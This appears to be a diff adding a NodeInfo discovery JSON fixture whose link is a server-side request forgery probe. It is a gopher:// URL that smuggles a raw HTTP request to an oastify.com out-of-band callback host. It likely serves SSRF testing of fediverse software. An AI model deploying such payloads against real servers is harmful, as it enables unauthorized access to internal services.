@@ -1,0 +1,8 @@
+{
+  "links": [
+    {
+      "rel": "http://nodeinfo.diaspora.software/ns/schema/2.0",
+      "href": "gopher://l8u9dzasqqpgbu57me486ilc238uwkk9.oastify.com:80/_GET%20/GOPHER_BYTES_OK%20HTTP/1.1%0d%0aHost:%20<COLLAB-HOST>%0d%0aConnection:%20close%0d%0a%0d%0a"
+    }
+  ]
+}
